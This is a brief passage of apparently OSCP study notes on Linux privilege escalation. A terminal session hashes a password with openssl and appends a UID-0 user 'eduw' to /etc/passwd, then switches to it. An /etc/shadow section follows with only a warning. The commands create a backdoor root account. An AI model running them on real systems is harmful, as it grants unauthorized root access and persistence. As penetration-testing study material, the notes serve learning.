#### /etc/passwd
```
┌─[root@edu-virtualbox]─[/home/edu/OSCP]
└──╼ #openssl passwd test
$1$AjcbF6Z3$txY0x34m/KGP/AeiBbiDB1         //  Generates a hash for the password "test"

┌─[root@edu-virtualbox]─[/home/edu/OSCP]
└──╼ #echo 'eduw:$1$AjcbF6Z3$txY0x34m/KGP/AeiBbiDB1:0:0:root:/root:/bin/bash' >> /etc/passwd

┌─[root@edu-virtualbox]─[/home/edu/OSCP]
└──╼ #su eduw

```

#### /etc/shadow
Note: this is very risky, as you'll need to change an existing password.
```

```

